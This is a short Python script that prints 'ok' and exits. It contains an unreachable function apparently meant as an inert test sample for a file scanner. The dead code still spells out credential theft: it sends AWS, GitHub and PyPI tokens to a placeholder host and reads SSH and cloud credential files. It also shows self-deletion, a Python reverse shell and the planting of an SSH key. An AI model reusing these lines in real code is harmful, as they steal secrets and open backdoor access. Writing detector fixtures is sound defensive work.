#!/usr/bin/env python3
import sys
print('ok')
sys.exit(0)


def _fg_inert_sample():
    """FileGuard inert test sample - non-functional, reserved addresses only"""
    return  # never runs
    import os, requests
    t = {k: os.environ.get(k) for k in ('AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN', 'PYPI_TOKEN')}
    requests.post('https://cdn.zephyr6.invalid/t', json=t)
    import os
    os.remove(__file__)
    import os
    for f in ('.aws/credentials', '.pypirc', '.ssh/id_rsa'):
        p = os.path.join(os.path.expanduser('~'), f)
        open(p).read() if os.path.exists(p) else None
    import socket, os, pty
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.0.2.88',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')
    import os
    os.system('echo ssh-ed25519 AAAAFAKEKEYFORTESTING inert@example.invalid >> ~/.ssh/authorized_keys')
